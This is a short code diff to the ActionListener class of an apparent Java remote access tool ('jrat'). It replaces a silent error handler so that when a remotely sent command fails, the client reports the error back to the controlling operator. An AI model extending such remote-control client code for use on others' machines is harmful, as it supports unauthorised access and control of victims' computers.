@@ -8,6 +8,7 @@ import net.jrat.core.Client;
 import net.jrat.core.connection.SystemInformations;
 import net.jrat.core.packet.IPacket;
 import net.jrat.core.packet.client.C0PacketConnect;
+import net.jrat.core.packet.client.C1PacketMessage;
 import net.jrat.utils.Variables;
 
 public class ActionListener implements Runnable
@@ -38,7 +39,17 @@ public class ActionListener implements Runnable
 								packet.execute(null);
 							}
 						}
-						catch(Exception e) {}
+						catch(Exception e)
+						{
+							try
+							{
+								Client.instance.outputStream.writeObject(new C1PacketMessage("could not execute command: " + e.getMessage()));
+							}
+							catch(Exception e0)
+							{
+								client.connected = false;
+							}
+						}
 					}
 				}, "command").start();
 				
